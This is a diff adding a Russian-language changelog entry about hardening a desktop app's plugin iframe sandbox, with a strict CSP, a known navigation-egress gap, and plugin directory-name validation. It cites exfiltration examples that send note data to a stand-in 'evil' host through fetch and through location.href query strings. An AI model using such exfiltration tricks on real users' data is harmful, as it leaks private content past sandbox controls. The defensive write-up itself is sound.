@@ -6,6 +6,34 @@
 
 ## [Unreleased]
 
+### Безопасность · Плагин-песочница: контейнмент fetch-класса egress iframe + строже валидатор каталога (security-хардининг)
+
+Две живые дыры плагин-песочницы (adversarial-критика плана плагин-эпика), закрытые независимо от судьбы
+эпика. Behavior-preserving для демо-плагина (работает как раньше).
+
+- **🔴 Контейнмент FETCH-КЛАССА egress плагинного iframe (THREAT_MODEL T2).** Sandbox-iframe
+  (`allow-scripts`, opaque origin) закрывал DOM/storage/родителя, но НЕ сетевой выход: плагин, прочитав
+  заметку через брокер, мог `fetch('https://evil',{body:текст})` / `img.src` / `navigator.sendBeacon`
+  ПРЯМО из iframe, минуя brokerный net-allowlist/SSRF-гард (app-CSP на srcdoc в этом WebView не
+  энфорсится). Фикс: собственная ЖЁСТКАЯ CSP первым `<meta http-equiv="Content-Security-Policy">` в
+  `<head>` srcdoc через единый хелпер `withPluginCsp` (константа `PLUGIN_CSP`): `default-src 'none';
+  script-src 'unsafe-inline'; style-src 'unsafe-inline'; connect-src 'none'; img-src 'none'; media-src
+  'none'; font-src 'none'; form-action 'none'; frame-src 'none'; base-uri 'none'; navigate-to 'none'`.
+  `connect-src 'none'` глушит fetch/XHR/beacon/img-пиксель наружу; `unsafe-inline` для script/style держит
+  UI-JS живым; `postMessage` не подпадает под `connect-src` → для fetch-класса единственный outlet
+  плагина остаётся broker-путь (`net.fetch` через GuardedClient). Единая точка вставки — будущий
+  загружаемый srcdoc (PLUG-2) наследует контейнмент. Регресс-пин unit'ами (точная CSP первым meta в
+  `<head>`; демо без внешних URL/`fetch`) (`apps/desktop/src/lib/plugin-host.ts`).
+  ⚠ **Known-gap (BACKLOG, до PLUG-2): navigation-egress НЕ закрыт.** `connect-src` не ловит
+  `location.href='https://evil?d='+данные` (навигация, эксфильтрация в query мимо fetch-класса и мимо
+  `sandbox=allow-scripts`). `navigate-to 'none'` добавлен как первый слой, но ненадёжен в WKWebView →
+  defence-in-depth, не гарантия; полное закрытие требует Tauri sub-frame navigation-handler (ОБЯЗАТЕЛЕН
+  до исполнения untrusted-кода в PLUG-2). Также known-gap: WebRTC/STUN на EOL-macOS 10.15.
+- **🟡 `valid_plugin_dir` отвергает `:` и whitespace.** Неймспейс-ключ `plugin:<dir>:<id>` (i18n-бандлы,
+  id команд) при `dir="a:b"`/пробелах был бы неоднозначным → латентно ломал бы обратный парсинг ключа.
+  Добавлено отвержение `:` и любого whitespace (`a:b`/`a b`/`a\tb` → reject; `my-plugin`/`plugin_1` → ok)
+  (`apps/desktop/src-tauri/src/commands/plugin.rs`).
+
 ### Исправлено · анти-флейк `sandbox::exec_child` — hang-guard-таймаут 5с→30с (мгновенные реальные бинари)
 
 **Файл:** `crates/nexus-core/src/sandbox/exec_child.rs` (только `mod tests`; прод-код не тронут).
